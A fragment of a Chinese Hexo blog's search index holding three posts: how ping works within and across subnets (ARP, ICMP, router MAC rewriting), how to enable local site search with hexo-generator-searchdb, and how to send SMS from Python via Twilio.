<p><img src="/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/image-20201102230615799.png" alt="image-20201102230615799"></p>
<p>实际局域网内的ping，实际过程的发生不到1毫秒。</p>
<h2 id="不同网段内"><a href="#不同网段内" class="headerlink" title="不同网段内"></a>不同网段内</h2><p>如果主机A要ping主机C，那么主机A发现主机C的IP和自己不是同一网段，他就去找网关转发，但是他也不知道网关的MAC地址情况下呢？他就会向之前那个步骤一样先发送一个ARP广播，学到网关的MAC地址，再发封装ICMP报文给网关路由器.。ICMP报文格式如下（目的MAC是路由器的网卡地址，目的IP还是主机C的ip。这也进一步反应了<strong>链路层只管一跳，而网络层管host-to-host</strong>）：</p>
<p><img src="/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/image-20201102230755283.png" alt="image-20201102230755283"></p>
<p>当路由器收到主机A发过来的ICMP报文，发现其目的地址是本身MAC地址，根据目的的IP2.1.1.1，查路由表，发现2.1.1.1/24的路由表项，得到一个出端口，去掉原来的MAC头部，加上自己的MAC地址向主机C转发。(如果网关也没有主机C的MAC地址，还是要向前面一个步骤一样，ARP广播一下即可相互学到。路由器2端口能学到主机D的MAC地址，主机D也能学到路由器2端口的MAC地址。)报文格式如下（源MAC是路由器网卡地址，目的MAC是主机C的地址）：</p>
<p><img src="/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/image-20201102230936828.png" alt="image-20201102230936828"></p>
<p>最后，在主机C已学到路由器2端口MAC地址，路由器2端口转发给路由器1端口，路由1端口学到主机A的MAC地址的情况下，他们就不需要再做ARP解析，就将ICMP的回显请求回复过来。报文格式大致如下: </p>
<p><img src="/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/image-20201102231055128.png" alt="image-20201102231055128"></p>
<p>路由器收到ICMP响应后，修改ICMP包的目的MAC为00-50-56-C0-00-01,源MAC为00-50-56-C0-00-02，源IP和目的IP保持不变。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>hxxps://blog.csdn.net/li1914309758/article/details/78725516</p>
]]></content>
      <categories>
        <category>横贯八方</category>
      </categories>
      <tags>
        <tag>横贯八方</tag>
      </tags>
  </entry>
  <entry>
    <title>站内搜索功能</title>
    <url>/2020/11/04/%E7%AB%99%E5%86%85%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>在博客根目录安装插件hexo-generator-searchdb</p>
<p><img src="/2020/11/04/%E7%AB%99%E5%86%85%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/image-20201104221808009.png" alt="image-20201104221808009"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
<h2 id="配置根目录文件"><a href="#配置根目录文件" class="headerlink" title="配置根目录文件"></a>配置根目录文件</h2><p>修改根目录文件_config.yml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure>
<p>注意每行后面留出一个空格。</p>
<h2 id="配置主题文件"><a href="#配置主题文件" class="headerlink" title="配置主题文件"></a>配置主题文件</h2><p>修改主题配置文件_config.yml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">    enable: true</span><br></pre></td></tr></table></figure>
<p>在主题配置文件中将false改为true即可。</p>
<h2 id="配置效果"><a href="#配置效果" class="headerlink" title="配置效果"></a>配置效果</h2><p><img src="/2020/11/04/%E7%AB%99%E5%86%85%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/image-20201104222245498.png" alt="image-20201104222245498"></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-发送短信</title>
    <url>/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="使用python发送短信twilio"><a href="#使用python发送短信twilio" class="headerlink" title="使用python发送短信twilio"></a>使用python发送短信twilio</h1><p>主要内容是叙述如何使用Python传送手机短信，主要是以美国Twilio公司所提供的服务为例说明。全球这类通信公司很多，可以用关键词free sms gateway查询，sms全名是shortmessage service短信服务，这是目前电信公司很普遍的一个服务。</p>
<h2 id="安装twilio模块"><a href="#安装twilio模块" class="headerlink" title="安装twilio模块"></a>安装twilio模块</h2><p>为了要用Python设计与Twilio公司有关的网络服务，首先要安装twilio模块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install twilio</span><br></pre></td></tr></table></figure>
<h2 id="到Twilio公司注册账号"><a href="#到Twilio公司注册账号" class="headerlink" title="到Twilio公司注册账号"></a>到Twilio公司注册账号</h2><p>为了要使用Twilio公司所提供的短信服务，需要到Twilio公司注册账号，以取得下列信息：</p>
<p>1、Account SID：Twilio API key账号。</p>
<p>2、Auth TOKEN：Twilio账号的图腾(TOKEN)。</p>
<p>3、Twilio Number：Twilio电话号码。</p>
<p>4、Verified numbers：电话号码使用地区。</p>
<p>上述信息我们可以称之为API key(密钥)，有了上述密钥，您就可以使用Python程序发送短信了。</p>
<h4 id="申请账号"><a href="#申请账号" class="headerlink" title="申请账号"></a>申请账号</h4><p>首先进入hxxp://<a href="http://www.twilio.com网站。" target="_blank" rel="noopener">www.twilio.com网站。</a></p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104231058183.png" alt="image-20201104231058183"></p>
<p>点选Get a free API key，然后将看到空白窗体。填写完成后，按Get Started按钮。</p>
<p>为了不被网络恶意软件注册攻击，所以会要求输入电话号码，Twilio网站会从你登录IP判断你的位置，然后自动勾选你的国家或地区，请在上述字段输入你的手机号码，然后按Verify via SMS按钮，Twilio公司会发送验证码到你的手机，下列是笔者手机收到验证码的图例。</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104231445340.png" alt="image-20201104231445340"></p>
<p>输入完成后，请按Submit按钮，整个注册就算完成了。</p>
<h4 id="获得Account-SID"><a href="#获得Account-SID" class="headerlink" title="获得Account SID"></a>获得Account SID</h4><p>注册成功后，在画面上可以看到Dashboard，请点选可以在此看到的所申请的Account SID信息。</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104231543343.png" alt="image-20201104231543343"></p>
<p>未来可以点选上述SID码，然后复制到Python程序。</p>
<h4 id="获得Auth-TOKEN"><a href="#获得Auth-TOKEN" class="headerlink" title="获得Auth TOKEN"></a>获得Auth TOKEN</h4><p>与SID一样，使用时最好用复制方式粘贴到Python程序，比较方便，同时也不会有错误。</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104231735522.png" alt="image-20201104231735522"></p>
<h4 id="获得Twilio-Number"><a href="#获得Twilio-Number" class="headerlink" title="获得Twilio Number"></a>获得Twilio Number</h4><p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104231812663.png" alt="image-20201104231812663"></p>
<p>在屏幕上有Phone Numbers，点选Phone Numbers。</p>
<p>将会看到：</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104231859663.png" alt="image-20201104231859663"></p>
<p>点选Get Started按钮：</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104232005975.png" alt="image-20201104232005975"></p>
<p>点选Get yourfirst Twilio phone number按钮：</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104232040297.png" alt="image-20201104232040297"></p>
<p>将列出你的Twilio号码，按Choose this Number按钮：</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104232122259.png" alt="image-20201104232122259"></p>
<p>未来python程序需要上述格式的号码。</p>
<h4 id="设定Twilio使用地区"><a href="#设定Twilio使用地区" class="headerlink" title="设定Twilio使用地区"></a>设定Twilio使用地区</h4><p>由于这是试用账号，同时我们不是在美国本土，所以还需在系统设定短信适用地区。</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104232224000.png" alt="image-20201104232224000"></p>
<p>点选所有服务功能，然后选Programmable SMS服务，将看到下列画面。</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104232307073.png" alt="image-20201104232307073"></p>
<p>点选these countries字符串，将看到Message Grographic Permissions标题，选China(+86)，未来用Python所发的短信就可以在中国大陆使用了。</p>
<h2 id="使用Python程序设计发送短信"><a href="#使用Python程序设计发送短信" class="headerlink" title="使用Python程序设计发送短信"></a>使用Python程序设计发送短信</h2><p>导入模块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from twilio.rest import client</span><br></pre></td></tr></table></figure>
<p>发送短信的方法:</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104232616420.png" alt="image-20201104232616420"></p>
<p>执行结果：</p>
<p><img src="/2020/11/04/Python-%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1/image-20201104232657932.png" alt="image-20201104232657932"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
</search>
